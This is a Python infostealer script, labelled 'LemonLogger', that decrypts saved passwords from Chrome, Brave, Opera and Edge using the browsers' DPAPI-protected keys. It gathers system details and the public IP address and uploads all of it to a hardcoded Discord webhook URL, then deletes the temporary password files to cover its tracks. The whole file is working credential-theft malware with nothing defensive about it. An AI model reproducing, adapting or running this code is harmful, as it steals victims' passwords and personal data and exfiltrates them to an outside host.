import os
try:
    import json, base64, sqlite3, win32crypt, shutil, requests, getpass, socket, platform, psutil
    from Crypto.Cipher import AES
    from discord_webhook import DiscordWebhook, DiscordEmbed
except ModuleNotFoundError:
    print("modules are not installed")
    os.system("pip3 install pypiwin32 pycryptodome discord.py discord-webhook requests psutil")
    print("Got An Error?, restart the program!")
#######################################################################
#WARNING WEBHOOK IS INSTALLED CHANGE BEFORE EXECUTED!#
#######################################################################
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(str(e))
def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

WEBHOOK_URL = 'https://discord.com/api/webhooks/1153282406497927168/YD2Xc3y6gcbZrqbxL2fuFyjG-empcSebrZFqlD9gj19jcDEUkoTeicqcctzhCVDw8d6z'
webhook=""
webhook = DiscordWebhook(url=WEBHOOK_URL, username="LemonLogger", rate_limit_retry=True)
ip = requests.get('https://api.ipify.org').text
username = getpass.getuser()
hostname = socket.gethostname()
uname = platform.uname()
svmem = psutil.virtual_memory()
webhookembed = DiscordWebhook(url=WEBHOOK_URL)
total, used, free = shutil.disk_usage("/")
#######################################################################
#######################################################################
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    if __name__ == '__main__':
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                with open("GooglePasswords.txt","a") as f:
                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                    f.close()
            with open("GooglePasswords.txt", "rb") as f:
                webhookembed.add_file(file=f.read(), filename='GooglePasswords.txt')
        except Exception as e:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass
except FileNotFoundError:
    try:
        response = webhookembed.execute()
    except Exception as e:
        print("Error:", e)
    pass
#######################################################################
#######################################################################
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    if __name__ == '__main__':
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                with open("BravePasswords.txt","a") as f:
                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                    f.close()
            with open("BravePasswords.txt", "rb") as f:
                webhookembed.add_file(file=f.read(), filename='BravePasswords.txt')
        except Exception as e:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass
except FileNotFoundError:
    try:
        response = webhookembed.execute()
    except Exception as e:
        print("Error:", e)
    pass
#######################################################################
#######################################################################
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    if __name__ == '__main__':
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Login Data'
        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                with open("OperaPasswords.txt","a") as f:
                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                    f.close()
            with open("OperaPasswords.txt", "rb") as f:
                webhookembed.add_file(file=f.read(), filename='OperaPasswords.txt')
        except Exception as e:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass
        
except FileNotFoundError:
    try:
        response = webhookembed.execute()
    except Exception as e:
        print("Error:", e)
    pass
#######################################################################
#######################################################################
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    if __name__ == '__main__':
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                with open("EdgePasswords.txt","a") as f:
                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                    f.close()
            with open("EdgePasswords.txt", "rb") as f:
                webhookembed.add_file(file=f.read(), filename='EdgePasswords.txt')
        except Exception as e:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass
except FileNotFoundError:
    try:
        response = webhookembed.execute()
    except Exception as e:
        print("Error:", e)
    pass
########################################################################################
##FOR EXTRA DATA

embed = DiscordEmbed(title='Extra Data')
embed.set_timestamp()
embed.add_embed_field(name='**SYSTEM INFO**', value=f'Username: {username}\nPC Name: {hostname}\nSystem: {uname.system}\nRelease: {uname.release}\nVersion: {uname.version}\nMachine: {uname.machine}\nProcessor: {uname.processor}')
embed.add_embed_field(name='**MISC**', value=f"IP Address: {ip}\nPhysical Cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\nTotal Memory: {get_size(svmem.total)}\nAvailable Memory: {get_size(svmem.available)}\nMemory Used: {get_size(svmem.used)}")

webhookembed.add_embed(embed)

response = webhookembed.execute()
os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt")